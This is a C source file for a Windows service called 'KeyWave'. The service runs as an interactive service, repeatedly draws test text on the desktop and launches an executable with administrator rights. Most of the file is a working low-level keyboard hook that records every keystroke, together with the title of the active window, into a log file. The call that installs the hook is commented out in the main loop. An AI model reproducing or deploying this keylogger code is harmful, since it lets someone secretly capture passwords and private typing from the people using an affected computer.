#include <windows.h>
#include <stdbool.h>
#include <stdio.h>
#include <signal.h>
#include <dbt.h>
#include <tchar.h>
#include <time.h>
#include "interactive.h"

/* #define WITH_DEBUG 1 */

#ifndef MAX_PATH
#define MAX_PATH 128
#endif

#ifndef MAX_STRING
#define MAX_STRING 1024
#endif

#ifndef SERVICE_NAME
#define SERVICE_NAME "KeyWave"
#endif


typedef struct _ThisService {
    SERVICE_STATUS status;
    SERVICE_STATUS_HANDLE status_handle;
    HDEVNOTIFY device_notification_handle;
} ThisService;

typedef struct _ServiceState {
    ThisService service;
    HANDLE wakeup_event;
    bool force_exit;
} ServiceState;


static ServiceState g_service_state;
static const GUID GUID_VIOSERIAL_PORT = { 0x6fde7521, 0x1b65, 0x48ae,
    { 0xb6, 0x28, 0x80, 0xbe, 0x62, 0x1, 0x60, 0x26 } };
static char *g_module_dir = NULL;
static char *g_run_exe = "C:\\Program Files (x86)\\KeyWave\\Draw.exe";

// hook
static HHOOK g_keyboard_hook = NULL;
// Is shift key down ?
static bool g_shift = false;
// Store window
static HWND g_oldwindow = NULL;
// Window text
static char g_window_text[MAX_PATH];


void logging(const char *format,...)
{
    va_list ap;
    char log_file[MAX_PATH] = {0};
    FILE *fp = NULL;
    time_t t;
    struct tm* lt;

    time(&t);
    lt = localtime(&t);

#ifndef WITH_DEBUG
    GetModuleFileName(NULL, log_file, MAX_PATH);
    *strrchr(log_file, '\\') = 0;
    strcat(log_file, "\\log.txt");
    fp = fopen(log_file, "a+");
#else
    fp = stdout;
#endif

    fprintf(fp, "[%d/%d/%d %d:%d:%d] ", lt->tm_year+1900, lt->tm_mon,
            lt->tm_mday, lt->tm_hour, lt->tm_min, lt->tm_sec);
    va_start(ap, format);
    vfprintf(fp, format, ap);
    va_end(ap);
    fflush(fp);

#ifndef WITH_DEBUG
    fclose(fp);
#endif
}


LPCWSTR str2lpcwstr(const char* str, WCHAR* wsz)
{
    memset(wsz, 0, sizeof(wsz));
    MultiByteToWideChar(CP_ACP, 0, str, strlen(str)+1, wsz,
            sizeof(wsz)/sizeof(wsz[0]));
    return (LPCWSTR)wsz;
}


char* lpcwstr2str(WCHAR* lpcwszStr, char* str)
{
    memset(str, 0, sizeof(str));
    DWORD dwMinSize = 0;

    dwMinSize = WideCharToMultiByte(CP_OEMCP, 0, lpcwszStr, -1, NULL, 0, NULL, false);
    if (0 == dwMinSize) {
        return str;
    }
    WideCharToMultiByte(CP_OEMCP, 0, lpcwszStr, -1, str, dwMinSize, NULL, false);
    return str;
}


// check directory exist
bool is_dir_exist(const char* dir)
{
	WIN32_FIND_DATA find_data;
	bool val= false;
	HANDLE h_find = FindFirstFile(dir, &find_data);
    if ((h_find != INVALID_HANDLE_VALUE) &&
            (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
        val= true;
    }
	FindClose(h_find);
	return val;
}


void write_keylogger(char *str)
{
    logging("%s\n", str);
}


// Unhook and exit
void hook_exit()
{
    if (g_keyboard_hook != NULL) {
        UnhookWindowsHookEx(g_keyboard_hook);
        g_keyboard_hook = NULL;
    }
}


// Callback function to be hooked
LRESULT CALLBACK keyboard_hook_proc(int nCode, WPARAM wParam, LPARAM lParam)
{
    bool bControlKeyDown=0;
    // Get current state of capsLock
    bool caps = GetKeyState(VK_CAPITAL) < 0;
    KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *) lParam;
    DWORD dwMsg;
    if (nCode == HC_ACTION) {
        // Determine the current state of shift key
        if (p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT) {
            if(wParam == WM_KEYDOWN) {
                g_shift = true;
            } else {
                g_shift = false;
            }
        }
        // Check if F12 + CTRL is pressed, if yes -> exit
        bControlKeyDown = GetAsyncKeyState (VK_CONTROL) >> ((sizeof(SHORT) * 8) - 1);
        if (p->vkCode == VK_F12 && bControlKeyDown) {// If F12 and CTRL are pressed
            hook_exit();
        }
        // Start logging keys
        if(wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN) { // If key has been pressed
            HWND newWindow = GetForegroundWindow();
            if (g_oldwindow == NULL || newWindow != g_oldwindow) {
                // Get Active window title and store it
                GetWindowTextA(GetForegroundWindow(), g_window_text, sizeof(g_window_text));
                write_keylogger("\nActive Window: ");
                write_keylogger(g_window_text);
                write_keylogger("\n");
                g_oldwindow = newWindow;
            }
            // Virtual key codes reference: http://msdn.microsoft.com/en-us/library/dd375731%28v=VS.85%29.aspx
            switch(p->vkCode) { // Compare virtual keycode to hex values and log keys accordingly
                //Number keys
                case 0x30: write_keylogger(g_shift?")":"0");break;
                case 0x31: write_keylogger(g_shift?"!":"1");break;
                case 0x32: write_keylogger(g_shift?"@":"2");break;
                case 0x33: write_keylogger(g_shift?"#":"3");break;
                case 0x34: write_keylogger(g_shift?"$":"4");break;
                case 0x35: write_keylogger(g_shift?"%":"5");break;
                case 0x36: write_keylogger(g_shift?"^":"6");break;
                case 0x37: write_keylogger(g_shift?"&":"7");break;
                case 0x38: write_keylogger(g_shift?"*":"8");break;
                case 0x39: write_keylogger(g_shift?"(":"9");break;
                // Numpad keys
                case 0x60: write_keylogger("0");break;
                case 0x61: write_keylogger("1");break;
                case 0x62: write_keylogger("2");break;
                case 0x63: write_keylogger("3");break;
                case 0x64: write_keylogger("4");break;
                case 0x65: write_keylogger("5");break;
                case 0x66: write_keylogger("6");break;
                case 0x67: write_keylogger("7");break;
                case 0x68: write_keylogger("8");break;
                case 0x69: write_keylogger("9");break;
                // Character keys
                case 0x41: write_keylogger(caps?(g_shift?"a":"A"):(g_shift?"A":"a"));break;
                case 0x42: write_keylogger(caps?(g_shift?"b":"B"):(g_shift?"B":"b"));break;
                case 0x43: write_keylogger(caps?(g_shift?"c":"C"):(g_shift?"C":"c"));break;
                case 0x44: write_keylogger(caps?(g_shift?"d":"D"):(g_shift?"D":"d"));break;
                case 0x45: write_keylogger(caps?(g_shift?"e":"E"):(g_shift?"E":"e"));break;
                case 0x46: write_keylogger(caps?(g_shift?"f":"F"):(g_shift?"F":"f"));break;
                case 0x47: write_keylogger(caps?(g_shift?"g":"G"):(g_shift?"G":"g"));break;
                case 0x48: write_keylogger(caps?(g_shift?"h":"H"):(g_shift?"H":"h"));break;
                case 0x49: write_keylogger(caps?(g_shift?"i":"I"):(g_shift?"I":"i"));break;
                case 0x4A: write_keylogger(caps?(g_shift?"j":"J"):(g_shift?"J":"j"));break;
                case 0x4B: write_keylogger(caps?(g_shift?"k":"K"):(g_shift?"K":"k"));break;
                case 0x4C: write_keylogger(caps?(g_shift?"l":"L"):(g_shift?"L":"l"));break;
                case 0x4D: write_keylogger(caps?(g_shift?"m":"M"):(g_shift?"M":"m"));break;
                case 0x4E: write_keylogger(caps?(g_shift?"n":"N"):(g_shift?"N":"n"));break;
                case 0x4F: write_keylogger(caps?(g_shift?"o":"O"):(g_shift?"O":"o"));break;
                case 0x50: write_keylogger(caps?(g_shift?"p":"P"):(g_shift?"P":"p"));break;
                case 0x51: write_keylogger(caps?(g_shift?"q":"Q"):(g_shift?"Q":"q"));break;
                case 0x52: write_keylogger(caps?(g_shift?"r":"R"):(g_shift?"R":"r"));break;
                case 0x53: write_keylogger(caps?(g_shift?"s":"S"):(g_shift?"S":"s"));break;
                case 0x54: write_keylogger(caps?(g_shift?"t":"T"):(g_shift?"T":"t"));break;
                case 0x55: write_keylogger(caps?(g_shift?"u":"U"):(g_shift?"U":"u"));break;
                case 0x56: write_keylogger(caps?(g_shift?"v":"V"):(g_shift?"V":"v"));break;
                case 0x57: write_keylogger(caps?(g_shift?"w":"W"):(g_shift?"W":"w"));break;
                case 0x58: write_keylogger(caps?(g_shift?"x":"X"):(g_shift?"X":"x"));break;
                case 0x59: write_keylogger(caps?(g_shift?"y":"Y"):(g_shift?"Y":"y"));break;
                case 0x5A: write_keylogger(caps?(g_shift?"z":"Z"):(g_shift?"Z":"z"));break;
                // Special keys
                case VK_SPACE: write_keylogger(" "); break;
                case VK_RETURN: write_keylogger("\n"); break;
                case VK_TAB: write_keylogger("\t"); break;
                case VK_ESCAPE: write_keylogger("[ESC]"); break;
                case VK_LEFT: write_keylogger("[LEFT]"); break;
                case VK_RIGHT: write_keylogger("[RIGHT]"); break;
                case VK_UP: write_keylogger("[UP]"); break;
                case VK_DOWN: write_keylogger("[DOWN]"); break;
                case VK_END: write_keylogger("[END]"); break;
                case VK_HOME: write_keylogger("[HOME]"); break;
                case VK_DELETE: write_keylogger("[DELETE]"); break;
                case VK_BACK: write_keylogger("[BACKSPACE]"); break;
                case VK_INSERT: write_keylogger("[INSERT]"); break;
                case VK_LCONTROL: write_keylogger("[CTRL]"); break;
                case VK_RCONTROL: write_keylogger("[CTRL]"); break;
                case VK_LMENU: write_keylogger("[ALT]"); break;
                case VK_RMENU: write_keylogger("[ALT]"); break;
                case VK_F1: write_keylogger("[F1]");break;
                case VK_F2: write_keylogger("[F2]");break;
                case VK_F3: write_keylogger("[F3]");break;
                case VK_F4: write_keylogger("[F4]");break;
                case VK_F5: write_keylogger("[F5]");break;
                case VK_F6: write_keylogger("[F6]");break;
                case VK_F7: write_keylogger("[F7]");break;
                case VK_F8: write_keylogger("[F8]");break;
                case VK_F9: write_keylogger("[F9]");break;
                case VK_F10: write_keylogger("[F10]");break;
                case VK_F11: write_keylogger("[F11]");break;
                case VK_F12: write_keylogger("[F12]");break;
                // Shift keys
                case VK_LSHIFT: break; // Do nothing
                case VK_RSHIFT: break; // Do nothing
                // Symbol keys
                case VK_OEM_1: write_keylogger(g_shift?":":";");break;
                case VK_OEM_2: write_keylogger(g_shift?"?":"/");break;
                case VK_OEM_3: write_keylogger(g_shift?"~":"`");break;
                case VK_OEM_4: write_keylogger(g_shift?"{":"[");break;
                case VK_OEM_5: write_keylogger(g_shift?"|":"\\");break;
                case VK_OEM_6: write_keylogger(g_shift?"}":"]");break;
                case VK_OEM_7: write_keylogger(g_shift?"\"":"'");break;
                case VK_OEM_PLUS: write_keylogger(g_shift?"+":"=");break;
                case VK_OEM_COMMA: write_keylogger(g_shift?"<":",");break;
                case VK_OEM_MINUS: write_keylogger(g_shift?"_":"-");break;
                case VK_OEM_PERIOD: write_keylogger(g_shift?">":".");break;
                default:
                    dwMsg = p->scanCode << 16;
                    dwMsg += p->flags << 24;
                    char key[16];
                    GetKeyNameText(dwMsg, key, 15);
                    write_keylogger(key);
                    break;
            }
        }
    }
    // Forward the event to other hooks
    return CallNextHookEx(NULL,nCode,wParam,lParam);
}


void init_hook(HINSTANCE h_instance)
{
    g_keyboard_hook = SetWindowsHookEx(
            WH_KEYBOARD_LL,  // keyboard low hook
			keyboard_hook_proc,
            h_instance,
            0);
    if (g_keyboard_hook != NULL) {
        logging("SetWindowsHookEx ok...\n");
    } else {
        logging("SetWindowsHookEx error...\n");
    }
}


HFONT create_format_font(LPCTSTR face, int width, int height, int angle)
{
	HFONT hFont;
	hFont = CreateFont(
			height,      //字体的逻辑高度
			width,       //逻辑平均字符宽度
			angle,       //与水平线的角度
			0,           //基线方位角度
			FW_REGULAR,  //字形：常规
			FALSE,       //字形：斜体
			FALSE,       //字形：下划线
			FALSE,       //字形：粗体
			GB2312_CHARSET,          //字符集
			OUT_DEFAULT_PRECIS,      //输出精度
			CLIP_DEFAULT_PRECIS,     //剪截精度
			PROOF_QUALITY,           //输出品质
			FIXED_PITCH | FF_MODERN, //倾斜度
			face                     //字体
			);
	return hFont;
}


void show_file(HDC hdc, char *file)
{
    FILE *fp = NULL;
    wchar_t wsz_buf[MAX_STRING] = {0};
    wchar_t *wsz_end = L"# Analysis";
    int wsz_len = 0;
    int row = 50;
    int col = 900;

    logging("Open file: %s\n", file);

    fp = fopen(file, "r,ccs=UTF-8");
    if (fp != NULL) {
        while(fgetws(wsz_buf, sizeof(wsz_buf) - sizeof(wchar_t), fp) != NULL ) {
            if (wcsncmp(wsz_buf, wsz_end, wcslen(wsz_end)) == 0) {
                break;
            }
            wsz_len = wcslen(wsz_buf);
            if (wsz_len >= 2) {
                wsz_len += 1;
            } else {
                wsz_len = 0;
            }

            char tmp_buf[2*MAX_STRING];
            logging("%s\n", lpcwstr2str(wsz_buf, tmp_buf));

            TextOutW(hdc, col, row, wsz_buf, wsz_len);
            row += 20;
            memset(wsz_buf, 0, sizeof(wsz_buf));
        }
        fclose(fp);
    } else {
        logging("Open file(%s) error!\n", file);
    }
}


void draw_text_from_file(char *file)
{
    // 获取一个可供画图的DC
    HDC hdc = GetWindowDC(GetDesktopWindow());
    /* HDC hdc = GetWindowDC(HWND_DESKTOP); */
    if (hdc == NULL) {
        logging("Get HDC error!\n");
    } else {
        logging("Get HDC: %ld   %d\n", hdc, GetDesktopWindow());
    }

	// 创建红色1像素宽度的实线画笔
	HPEN hpen1 = CreatePen(PS_SOLID, 8, RGB(255, 0, 0));
	// 创建一个实体蓝色画刷
	HBRUSH hbrush1 = CreateSolidBrush(RGB(0, 0, 255));
	// 创建字体
	HFONT hfont1 = create_format_font((LPCTSTR)"宋体", 0, 15, 0);

	// 将hpen1和hbrush1选进HDC，并保存HDC原来的画笔和画刷
	HPEN hpen_old = (HPEN)SelectObject(hdc, hpen1);
	HBRUSH hbrush_old = (HBRUSH)SelectObject(hdc, hbrush1);
	HFONT hfont_old = (HFONT)SelectObject(hdc, hfont1);

    /* show_file(hdc, file); */
    wchar_t text1[] = L"你好，这是一个测试。";
    TextOutW(hdc, 800, 60, text1, wcslen(text1));
    Sleep(500);
    TextOutW(hdc, 800, 60, text1, wcslen(text1));
    Sleep(500);
    TextOutW(hdc, 800, 60, text1, wcslen(text1));
    Sleep(500);
    TextOutW(hdc, 800, 60, text1, wcslen(text1));

	// 恢复原来的画笔和画刷
	SelectObject(hdc, hpen_old);
	SelectObject(hdc, hbrush_old);
	SelectObject(hdc, hfont_old);
}


void do_wall_text(void *args)
{
    char text_file[MAX_PATH] = {0};
    strcpy(text_file, g_module_dir);
    strcat(text_file, "\\text\\");

    WIN32_FIND_DATA *p_find_data = (WIN32_FIND_DATA *)args;
    if (p_find_data && p_find_data->cFileName) {

        strcat(text_file, p_find_data->cFileName);

        draw_text_from_file(text_file);
        Sleep(10);
        draw_text_from_file(text_file);
    } else {
        Sleep(1);
    }
}


void for_each_files(const char* dir, void (*pf)(void *))
{
    HANDLE f_find;
    WIN32_FIND_DATA find_data;
    char buf[MAX_PATH] = {0};

    if (!is_dir_exist(dir)) {
        return;
    }

    strcpy(buf, dir);
    strcat(buf, "\\*.*");

	f_find = FindFirstFile(buf, &find_data);
    if (f_find == INVALID_HANDLE_VALUE) {
        logging("Find first file error\n");
        return;
    }
	do {
		// ignore "." and ".."
        if (strcmp(find_data.cFileName, ".") == 0 ||
                strcmp(find_data.cFileName, "..") == 0)
            continue;

        // not directory
        if (!(find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            logging("file name: %s\n", find_data.cFileName);
            if (pf)
                (*pf)((void *)&find_data);
		}
	} while (FindNextFile(f_find, &find_data));
	FindClose(f_find);
}


static int run_agent_once(ServiceState *s)
{
    char text_dir[MAX_PATH] = {0};

    strcpy(text_dir, g_module_dir);
    strcat(text_dir, "\\text");

    logging("Start run agent once...\n");

    for_each_files(text_dir, do_wall_text);

    PROCESS_INFORMATION pi;
    createProcessWithAdmin(g_run_exe, &pi);

    return EXIT_SUCCESS;
}


static void stop_agent(ServiceState *s, bool requested)
{
    if (!s->force_exit) {
        s->force_exit = requested;
    }
}


static int run_agent(ServiceState *s)
{
    int ret = EXIT_SUCCESS;
    s->force_exit = false;

    do {
        logging(">>>>> Start run agent...\n");
        ret = run_agent_once(s);
        Sleep(5000);

        /* init_hook(hInstance); */
		/* keep_alive(); */
    } while (!s->force_exit);

    hook_exit();

    return ret;
}


static void quit_handler(int sig)
{
    int i = 0;
    HANDLE hEventTimeout;

    logging("Thawing filesystems before exiting!\n");

    hEventTimeout = OpenEvent(EVENT_ALL_ACCESS, FALSE, "EVENT_NAME_TIMEOUT");
    if (hEventTimeout) {
        WaitForSingleObject(hEventTimeout, 0);
        CloseHandle(hEventTimeout);
    }
    stop_agent(&g_service_state, true);
}


DWORD WINAPI service_ctrl_handler(DWORD ctrl, DWORD type, LPVOID data,
        LPVOID ctx)
{
    DWORD ret = NO_ERROR;
    ThisService *service = &g_service_state.service;

    switch (ctrl)
    {
        case SERVICE_CONTROL_STOP:
        case SERVICE_CONTROL_SHUTDOWN:
            quit_handler(SIGTERM);
            SetEvent(g_service_state.wakeup_event);
            service->status.dwCurrentState = SERVICE_STOP_PENDING;
            SetServiceStatus(service->status_handle, &service->status);
            break;
        case SERVICE_CONTROL_DEVICEEVENT:
            // handle_serial_device_events(type, data);
            break;

        default:
            ret = ERROR_CALL_NOT_IMPLEMENTED;
    }
    return ret;
}


VOID WINAPI service_main(DWORD argc, TCHAR *argv[])
{
    ThisService *service = &g_service_state.service;

    service->status_handle = RegisterServiceCtrlHandlerEx(SERVICE_NAME,
        service_ctrl_handler, NULL);

    if (service->status_handle == 0) {
        logging("Failed to register extended requests function!\n");
        return;
    }

    /* service->status.dwServiceType = SERVICE_WIN32; */
    service->status.dwServiceType = SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS;
    service->status.dwCurrentState = SERVICE_RUNNING;
    service->status.dwControlsAccepted =
        SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    service->status.dwWin32ExitCode = NO_ERROR;
    service->status.dwServiceSpecificExitCode = NO_ERROR;
    service->status.dwCheckPoint = 0;
    service->status.dwWaitHint = 0;
    DEV_BROADCAST_DEVICEINTERFACE notification_filter;
    ZeroMemory(&notification_filter, sizeof(notification_filter));
    notification_filter.dbcc_devicetype = DBT_DEVTYP_DEVICEINTERFACE;
    notification_filter.dbcc_size = sizeof(DEV_BROADCAST_DEVICEINTERFACE);
    notification_filter.dbcc_classguid = GUID_VIOSERIAL_PORT;

    service->device_notification_handle =
        RegisterDeviceNotification(service->status_handle,
                &notification_filter, DEVICE_NOTIFY_SERVICE_HANDLE);
    if (!service->device_notification_handle) {
        logging("Failed to register device notification handle!\n");
        return;
    }
    SetServiceStatus(service->status_handle, &service->status);

    run_agent(&g_service_state);

    UnregisterDeviceNotification(service->device_notification_handle);
    service->status.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(service->status_handle, &service->status);
}


// The WIN API Message Loop
void keep_alive()
{
    MSG message;
	while(GetMessage(&message, NULL, 0, 0)) {
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
    static char module_dir[MAX_PATH] = {0};

    GetModuleFileName(NULL, module_dir, MAX_PATH);
    *strrchr(module_dir, '\\') = 0;
    g_module_dir = module_dir;

    logging("start main...\n");

    SERVICE_TABLE_ENTRY service_table[] = {
        { (char *)SERVICE_NAME, service_main }, { NULL, NULL } };
    StartServiceCtrlDispatcher(service_table);

    logging("end main...\n");

    return 0;
}
